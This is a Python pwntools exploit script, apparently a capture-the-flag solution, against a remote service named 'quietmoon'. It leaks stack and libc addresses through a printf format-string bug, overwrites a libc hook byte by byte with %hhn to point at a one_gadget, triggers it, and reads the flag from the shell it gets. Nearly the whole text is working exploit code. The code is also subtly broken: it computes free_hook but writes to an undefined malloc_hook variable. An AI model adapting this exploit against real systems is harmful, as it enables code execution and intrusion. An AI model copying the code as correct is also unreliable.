from pwn import *
#context.log_level='debug'

# Theres a printf vulnerability that leaks where the input buffer
# is, and some libc address

# First of all, you need the libc that they are using
# Thankfully, the binary has PIE disabled, so we can just leak
# a GOT address like puts/alarm and search it up in libc-database

# The aim is to leak libc, then change __malloc_hook/__free_hook to
# point to our magic gadget in libc

# we are going to write to _free_hook (_malloc_hook is called by
# something in puts() or something, so replacing it byte-by-byte
# will just crash our program as __malloc_hook points to not-yet-correct
# memory)

libc_path = "./libcs/libc-2.27.so"
libc = ELF(libc_path)
if args['R'] == '1':
    r = remote('ctf.pwn.sg', 2901)
else:
    r = process('./quietmoon')
def interact(s, l=False):
    r.sendlineafter("Can you find the Coven at /thecoven/flag?\n\n", s)
    if l:
        g= r.recvuntil('Can', drop=False)
        r.unrecv('Can')
        return g
    else:
        return r.recvline()


# leak
leaks = interact("%p "*3).split(' ')
input_addr = int(leaks[0], 16)
libc_leak = int(leaks[2], 16)
ret = input_addr +  0x118
read = libc_leak-0x11

#find where __free_hook is
free_hook = read-libc.symbols['read']+libc.symbols['__free_hook']
#find from running one_gadget on the libc
one_gadget = read-libc.symbols['read']+0x10a38c	

magic_gadget = one_gadget
return_addr = malloc_hook

print(hex(read))
print(hex(magic_gadget))
print(hex(return_addr))

# Write to __free_hook byte by byte
# 6 instead of 8 as we are on a time limit (alarm),
# and the last 2 bytes are \x00 anyway
for i in range(6):
    addr_to_write = p64(return_addr+i)
    byte_write = ord(p64(magic_gadget)[i])
    byte_write_str_len = len(str(byte_write))
    interact("%"+str(byte_write)+'c%8$hhn' + 'a'*(8-byte_write_str_len) +addr_to_write+'\n', True)

# apparently printf calls malloc() and free() !!!!!!!!!!!!
r.sendline("%100000c")

#success('PID '+str( r.pid))
# since we are on a time limit, get the flag quick
r.sendline('cat /thecoven/flag')
# also prints out the flag here
r.interactive()
